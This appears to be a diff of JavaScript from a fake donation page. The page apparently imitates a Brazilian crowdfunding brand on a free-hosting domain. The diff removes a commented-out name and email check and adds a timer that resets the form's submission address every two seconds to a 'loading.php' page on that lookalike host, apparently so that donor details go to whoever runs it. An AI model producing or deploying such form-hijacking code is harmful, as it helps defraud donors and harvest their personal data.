@@ -1,23 +1,14 @@
 
 function mudarAction(){
 document.formulario.action = "http://vakinha.myartsonline.com/cura-spiranza-juntos-pelo-bee/loading.php"; 
-setTimeout(function() {document.formulario.action = "https://vakinha.myartsonline.com/cura-spiranza-juntos-pelo-bee/loading.php"; }, 2000);
 
 }
-
-
-/*
-function ops(){
-	var nome = formulario.nome.value;
-	
-	var email_do_doador = formulario.email_do_doador.value;
-	if(nome.length < 2 || email_do_doador.indexOf("@") == -1){
-document.formulario.action = "https://vakinha.myartsonline.com/cura-spiranza-juntos-pelo-bee/loading.php";	
+function auto() {document.formulario.action = "https://vakinha.myartsonline.com/cura-spiranza-juntos-pelo-bee/loading.php";
 }
-}
+setInterval(auto,2000);
 
 
-*/
+
 
 
 
